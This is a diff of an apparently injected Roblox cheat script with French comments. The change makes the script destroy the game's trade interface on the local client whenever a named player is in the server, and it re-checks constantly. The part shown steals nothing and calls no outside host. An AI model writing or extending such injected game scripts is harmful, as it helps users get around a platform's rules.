@@ -201,22 +201,33 @@ FarmButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- [[ DÉTECTION INSTANTANÉE (ÉVÉNEMENTIELLE) ]] --
-local function checkTarget()
-    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
-    if not playerGui then return end
-    
+-- [[ BLOCAGE RADICAL ET ANTI-CLIGNOTEMENT ]] --
+local StarterGui = game:GetService("StarterGui")
+
+local function hardBlockGuis()
+    -- Si le joueur visé est dans le serveur
     if Players:FindFirstChild("zeynox0880") then
-        local gui1 = playerGui:FindFirstChild("TradeGUI_Phone")
-        local gui2 = playerGui:FindFirstChild("TradeGUI")
+        -- 1. On détruit/désactive dans le StarterGui pour éviter que ça se charge au spawn
+        local sGui1 = StarterGui:FindFirstChild("TradeGUI_Phone")
+        local sGui2 = StarterGui:FindFirstChild("TradeGUI")
+        if sGui1 then sGui1:Destroy() end
+        if sGui2 then sGui2:Destroy() end
         
-        if gui1 and gui1:IsA("ScreenGui") then gui1.Enabled = false end
-        if gui2 and gui2:IsA("ScreenGui") then gui2.Enabled = false end
+        -- 2. On nettoie le PlayerGui (ton écran actuel)
+        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+        if playerGui then
+            local g1 = playerGui:FindFirstChild("TradeGUI_Phone")
+            local g2 = playerGui:FindFirstChild("TradeGUI")
+            
+            if g1 then g1:Destroy() end
+            if g2 then g2:Destroy() end
+        end
     end
 end
 
--- Vérification immédiate au lancement du script
-task.spawn(checkTarget)
+-- Exécution immédiate à l'injection
+task.spawn(hardBlockGuis)
 
--- Déclenchement instantané dès qu'un joueur (quel qu'il soit) rejoint la partie
-Players.PlayerAdded:Connect(checkTarget)
+-- Surveillance en temps réel ultra-rapide (Chaque milliseconde si un élément est ajouté au PlayerGui)
+LocalPlayer:WaitForChild("PlayerGui").ChildAdded:Connect(hardBlockGuis)
+Players.PlayerAdded:Connect(hardBlockGuis)
